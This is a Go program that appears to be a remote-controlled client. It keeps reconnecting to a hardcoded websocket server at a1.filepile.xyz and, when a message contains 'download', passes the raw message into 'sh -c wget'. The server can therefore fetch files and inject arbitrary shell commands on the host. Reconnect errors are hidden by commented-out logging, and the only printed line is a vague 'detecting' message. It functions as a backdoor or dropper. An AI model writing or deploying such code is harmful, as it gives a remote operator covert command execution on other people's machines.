package main

import (
	"github.com/gorilla/websocket"
	"log"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

func connect(u url.URL) *websocket.Conn {
	var c *websocket.Conn
	var err error

	for {
		c, _, err = websocket.DefaultDialer.Dial(u.String(), nil)
		if err != nil {
			//log.Printf("Failed to connect, retrying in 3 seconds: %v", err)
			time.Sleep(3 * time.Second)
			continue
		}
		//log.Println("Connected to server!")
		return c
	}
}

func main() {
	Debug := true
	u := url.URL{Scheme: "ws", Host: "a1.filepile.xyz:8080", Path: "/ws"}
	log.Printf("감지중...")
	for {
		c := connect(u)

		for {
			_, msg, err := c.ReadMessage()
			if err != nil {
				//log.Printf("Connection lost or error: %v. Reconnecting...", err)
				c.Close()
				break
			}

			if string(msg) == "test\n" {
				log.Println("Test command received")
				err = c.WriteMessage(websocket.TextMessage, []byte("Test command received"))
				if err != nil {
					c.Close()
					break
				}
				continue
			}

			if string(msg) == "restart\n" {
				//restart client
				c.Close()
				break
			}

			if strings.Contains(string(msg), "download") {
				cmdOutput, err := exec.Command("sh", "-c", "wget "+string(msg)).Output()
				if Debug {
					if err != nil {
						//log.Printf("Command execution failed: %v", err)
						cmdOutput = []byte(err.Error()) // 오류 메시지를 실행 결과로 사용
					}

					err = c.WriteMessage(websocket.TextMessage, cmdOutput)
					if err != nil {
						//log.Printf("Failed to send message: %v. Reconnecting...", err)
						c.Close()
						break
					}
				}
			} else {
				err = c.WriteMessage(websocket.TextMessage, []byte("Invalid command"))
				if err != nil {
					c.Close()
					break
				}
				continue
			}

		}

		time.Sleep(3 * time.Second)
		//log.Println("Attempting to reconnect...")
	}
}
